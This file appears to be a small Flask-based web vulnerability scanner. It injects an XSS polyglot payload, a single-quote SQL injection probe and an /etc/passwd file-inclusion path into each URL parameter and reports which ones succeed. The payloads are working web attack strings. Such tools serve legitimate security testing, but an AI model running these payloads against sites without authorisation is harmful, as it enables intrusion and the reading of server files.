#!/usr/bin/python
# -*- coding: utf-8 -*-
from flask import Flask, request, jsonify
from ghost import Ghost
import requests
import re

app     = Flask(__name__)
firefox = Ghost()

"""scan_xss
Description: inject a polyglot vector for XSS in every parameter, then it checks if an alert was triggered
Parameters: vulns - list of vulnerabilities, url - address of the target, fuzz - parameter we modify
"""
def scan_xss(vulns, url, fuzz):
	payload = ' ">><marquee><img src=x onerror=alert(1)></marquee>" ></textarea\></|\><details/open/ontoggle=confirm`1` ><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>\'-->" ></script><sCrIpt>alert(1)</scRipt>"><img/id="confirm&lpar; 1)"/alt="/"src="/"onerror=eval(id&%23x29;>\'"><svg onload=alert`1`><!--'
	try:	
		with firefox.start() as session:
		
			# Send GET XSS
			inject = url.replace(fuzz+"=", fuzz+"="+payload)
			page, extra_resources = session.open(inject)
			result, resources = session.wait_for_alert(1)

			# Detect XSS result with an alert
			if result == '1':
				print "\t\t\033[93mXSS Detected \033[0m for ", fuzz, " with the payload :", payload
				vulns['xss']  += 1
				vulns['list'] += inject+'|DELIMITER|'
			else:
				print "\t\t\033[94mXSS Failed \033[0m for ", fuzz, " with the payload :", payload

	except Exception, e:
		print "\t\t\033[94mXSS Failed \033[0m for ", fuzz, " with the payload :", payload


"""scan_sql
Description: use a single quote to generate a SQL error in the page
Parameters: vulns - list of vulnerabilities, url - address of the target, fuzz - parameter we modify
"""
def scan_sql(vulns, url, fuzz):
	payload = "'"
	inject  = url.replace(fuzz+"=", fuzz+"="+payload)
	content = requests.get(inject).text

	if "Warning: SQLite3:" in content or "You have an error in your SQL syntax" in content:
		print "\t\t\033[93mSQLi Detected \033[0m for ", fuzz, " with the payload :", payload
		vulns['sql']  += 1
		vulns['list'] += inject+'|DELIMITER|'
	else:
		print "\t\t\033[94mSQLi Failed \033[0m for ", fuzz, " with the payload :", payload


"""scan_lfi
Description: will scan every parameter for LFI, checking for the common root:x:0:0
Parameters: vulns - list of vulnerabilities, url - address of the target, fuzz - parameter we modify
"""
def scan_lfi(vulns, url, fuzz):
	payload = "/etc/passwd"
	inject  = re.sub(fuzz+"="+"(.[^&]*)", fuzz+"="+payload , url)
	content = requests.get(inject).text

	if "root:x:0:0:root:/root:/bin/bash" in content:
		print "\t\t\033[93mLFI Detected \033[0m for ", fuzz, " with the payload :", payload
		vulns['lfi']  += 1
		vulns['list'] += inject+'|DELIMITER|'
	else:
		print "\t\t\033[94mLFI Failed \033[0m for ", fuzz, " with the payload :", payload, inject

""" Route /ping
Description: Simple ping implementation to check if the server is up via the extension
"""
@app.route('/ping',methods=['GET'])
def ping():
	return "pong"


""" Route /
Description: main route for the flask application, every scan is launched from here
"""
@app.route('/',methods=['GET'])
def index():
	vulns = {'xss': 0, 'sql': 0, 'lfi': 0, 'list':''}
	
	# Parse requests - extract arguments
	args  = request.args
	url   = args['url']

	if "?" in url:
		params  = url.split('?')[1]
		regex   = re.compile('([a-zA-Z0-9\-_]*?)=')
		matches = regex.findall(params)

		# Launch scans
		for fuzz in matches:
			scan_xss(vulns, url, fuzz)
			scan_sql(vulns, url, fuzz)
			scan_lfi(vulns, url, fuzz)
	
	# Display results as a json
	return jsonify(vulns)

if __name__ == '__main__':
	app.run(port=8000, threaded=True, passthrough_errors=False)